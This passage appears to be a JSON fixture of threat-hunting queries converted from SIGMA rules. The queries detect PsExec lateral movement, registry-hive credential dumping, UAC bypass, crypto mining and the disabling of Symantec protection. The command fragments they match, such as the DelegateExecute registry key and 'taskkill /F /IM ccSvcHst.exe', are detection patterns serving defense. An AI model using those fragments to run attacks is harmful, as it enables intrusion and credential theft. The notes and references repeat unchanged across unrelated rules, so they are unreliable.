            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a certain command line flag combination used by \"devinit.exe\", which can be abused as a LOLBIN to download arbitrary MSI packages on a Windows system",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Arbitrary MSI Download Via Devinit.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" -t msi-install \" and tgt.process.cmdline contains \" -i http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 546
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential use of an SSH utility to establish RDP over a reverse SSH Tunnel. This can be used by attackers to enable routing of network packets that would otherwise not reach their intended destination.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "Potential Remote Desktop Tunneling",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \":3389\" and (tgt.process.cmdline contains \" -L \" or tgt.process.cmdline contains \" -P \" or tgt.process.cmdline contains \" -R \" or tgt.process.cmdline contains \" -pw \" or tgt.process.cmdline contains \" -ssh \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 547
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential psexec command that initiate execution on a remote systems via common commandline flags used by the utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1587"
            ],
            "name": "Potential PsExec Remote Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"accepteula\" and tgt.process.cmdline contains \" -u \" and tgt.process.cmdline contains \" -p \" and tgt.process.cmdline contains \" \\\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 548
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Suspicious Reg Add Open Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"add\" and tgt.process.cmdline contains \"hkcu\\software\\classes\\ms-settings\\shell\\open\\command\" and tgt.process.cmdline contains \"/ve \" and tgt.process.cmdline contains \"/d\") or (tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"add\" and tgt.process.cmdline contains \"hkcu\\software\\classes\\ms-settings\\shell\\open\\command\" and tgt.process.cmdline contains \"/v\" and tgt.process.cmdline contains \"DelegateExecute\") or (tgt.process.cmdline contains \"reg\" and tgt.process.cmdline contains \"delete\" and tgt.process.cmdline contains \"hkcu\\software\\classes\\ms-settings\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 549
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line parameters or strings often used by crypto miners",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1496"
            ],
            "name": "Potential Crypto Mining Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" --cpu-priority=\" or tgt.process.cmdline contains \"--donate-level=0\" or tgt.process.cmdline contains \" -o pool.\" or tgt.process.cmdline contains \" --nicehash\" or tgt.process.cmdline contains \" --algo=rx/0 \" or tgt.process.cmdline contains \"stratum+tcp://\" or tgt.process.cmdline contains \"stratum+udp://\" or tgt.process.cmdline contains \"LS1kb25hdGUtbGV2ZWw9\" or tgt.process.cmdline contains \"0tZG9uYXRlLWxldmVsP\" or tgt.process.cmdline contains \"tLWRvbmF0ZS1sZXZlbD\" or tgt.process.cmdline contains \"c3RyYXR1bSt0Y3A6Ly\" or tgt.process.cmdline contains \"N0cmF0dW0rdGNwOi8v\" or tgt.process.cmdline contains \"zdHJhdHVtK3RjcDovL\" or tgt.process.cmdline contains \"c3RyYXR1bSt1ZHA6Ly\" or tgt.process.cmdline contains \"N0cmF0dW0rdWRwOi8v\" or tgt.process.cmdline contains \"zdHJhdHVtK3VkcDovL\") and (not (tgt.process.cmdline contains \" pool.c \" or tgt.process.cmdline contains \" pool.o \" or tgt.process.cmdline contains \"gcc -\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 550
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of other scripts using the Node executable packaged with Adobe Creative Cloud",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127",
                "t1059"
            ],
            "name": "Node Process Executions",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\Adobe Creative Cloud Experience\\libs\\node.exe\" and (not tgt.process.cmdline contains \"Adobe Creative Cloud Experience\\js\"))) | columns tgt.process.image.path,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 551
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a potential recon command where the results are piped to \"findstr\". This is meant to trigger on inline calls of \"cmd.exe\" via the \"/c\" or \"/k\" for example.\nAttackers often time use this technique to extract specific information they require in their reconnaissance phase.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1057"
            ],
            "name": "Recon Command Output Piped To Findstr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"*ipconfig*|*find*\" or tgt.process.cmdline=\"*net*|*find*\" or tgt.process.cmdline=\"*netstat*|*find*\" or tgt.process.cmdline=\"*ping*|*find*\" or tgt.process.cmdline=\"*systeminfo*|*find*\" or tgt.process.cmdline=\"*tasklist*|*find*\" or tgt.process.cmdline=\"*whoami*|*find*\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 552
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects process dump via legitimate sqldumper.exe binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Dumping Process via Sqldumper.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\sqldumper.exe\" and (tgt.process.cmdline contains \"0x0110\" or tgt.process.cmdline contains \"0x01100:40\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 553
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of format.com with an uncommon filesystem selection that could indicate a defense evasion activity in which \"format.com\" is used to load malicious DLL files or other programs.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Uncommon FileSystem Load Attempt By Format.com",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\format.com\" and tgt.process.cmdline contains \"/fs:\") and (not (tgt.process.cmdline contains \"/fs:exFAT\" or tgt.process.cmdline contains \"/fs:FAT\" or tgt.process.cmdline contains \"/fs:NTFS\" or tgt.process.cmdline contains \"/fs:ReFS\" or tgt.process.cmdline contains \"/fs:UDF\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 554
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of commands that leverage the \"mshtml.dll\" RunHTMLApplication export to run arbitrary code via different protocol handlers (vbscript, javascript, file, http...)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Mshtml.DLL RunHTMLApplication Suspicious Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\..\\\" and tgt.process.cmdline contains \"mshtml\") and (tgt.process.cmdline contains \"#135\" or tgt.process.cmdline contains \"RunHTMLApplication\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 555
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Possible Privilege Escalation via Weak Service Permissions",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\sc.exe\" and (tgt.process.integrityLevel in (\"Medium\",\"S-1-16-8192\"))) and ((tgt.process.cmdline contains \"config\" and tgt.process.cmdline contains \"binPath\") or (tgt.process.cmdline contains \"failure\" and tgt.process.cmdline contains \"command\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 556
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid Image detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Use Short Name Path in Image",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"~1\\\" or tgt.process.image.path contains \"~2\\\") and (not (((src.process.image.path in (\"C:\\Windows\\System32\\Dism.exe\",\"C:\\Windows\\System32\\cleanmgr.exe\")) or (src.process.image.path contains \"\\WebEx\\WebexHost.exe\" or src.process.image.path contains \"\\thor\\thor64.exe\") or tgt.process.displayName=\"InstallShield (R)\" or tgt.process.displayName=\"InstallShield (R) Setup Engine\" or tgt.process.publisher=\"InstallShield Software Corporation\") or ((tgt.process.image.path contains \"\\AppData\\\" and tgt.process.image.path contains \"\\Temp\\\") or (tgt.process.image.path contains \"~1\\unzip.exe\" or tgt.process.image.path contains \"~1\\7zG.exe\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 557
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects tools such as UACMe used to bypass UAC with computerdefaults.exe (UACMe 59)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Tools Using ComputerDefaults",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\")) and tgt.process.image.path=\"C:\\Windows\\System32\\ComputerDefaults.exe\") and (not (src.process.image.path contains \":\\Windows\\System32\" or src.process.image.path contains \":\\Program Files\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 558
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects whether the image specified in a process creation event doesn't refer to an \".exe\" (or other known executable extension) file. This can be caused by process ghosting or other unorthodox methods to start a process.\nThis rule might require some initial baselining to align with some third party tooling in the user environment.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Execution of Suspicious File Type Extension",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((not (tgt.process.image.path contains \".bin\" or tgt.process.image.path contains \".cgi\" or tgt.process.image.path contains \".com\" or tgt.process.image.path contains \".exe\" or tgt.process.image.path contains \".scr\" or tgt.process.image.path contains \".tmp\")) and (not ((tgt.process.image.path in (\"System\",\"Registry\",\"MemCompression\",\"vmmem\")) or tgt.process.image.path contains \":\\Windows\\Installer\\MSI\" or tgt.process.image.path contains \":\\Windows\\System32\\DriverStore\\FileRepository\\\" or (tgt.process.image.path contains \":\\Config.Msi\\\" and (tgt.process.image.path contains \".rbf\" or tgt.process.image.path contains \".rbs\")) or (src.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\") or tgt.process.image.path contains \":\\$Extend\\$Deleted\\\" or (tgt.process.image.path in (\"-\",\"\")) or not (tgt.process.image.path matches \"\\.*\"))) and (not (src.process.image.path contains \":\\ProgramData\\Avira\\\" or (tgt.process.image.path contains \"NVIDIA\\NvBackend\\\" and tgt.process.image.path contains \".dat\") or ((tgt.process.image.path contains \":\\Program Files (x86)\\WINPAKPRO\\\" or tgt.process.image.path contains \":\\Program Files\\WINPAKPRO\\\") and tgt.process.image.path contains \".ngn\") or (tgt.process.image.path contains \":\\Program Files (x86)\\MyQ\\Server\\pcltool.dll\" or tgt.process.image.path contains \":\\Program Files\\MyQ\\Server\\pcltool.dll\") or (tgt.process.image.path contains \"\\AppData\\Local\\Packages\\\" and tgt.process.image.path contains \"\\LocalState\\rootfs\\\") or tgt.process.image.path contains \"\\LZMA_EXE\" or tgt.process.image.path contains \":\\Program Files\\Mozilla Firefox\\\" or (src.process.image.path=\"C:\\Windows\\System32\\services.exe\" and tgt.process.image.path contains \"com.docker.service\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 559
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Dllhost.EXE Execution Anomaly",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\dllhost.exe\" and (tgt.process.cmdline in (\"dllhost.exe\",\"dllhost\"))) and (not not (tgt.process.cmdline matches \"\\.*\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 560
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects one of the possible scenarios for disabling Symantec Endpoint Protection.\nSymantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism.\nAs a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Taskkill Symantec Endpoint Protection",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"taskkill\" and tgt.process.cmdline contains \" /F \" and tgt.process.cmdline contains \" /IM \" and tgt.process.cmdline contains \"ccSvcHst.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 561
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
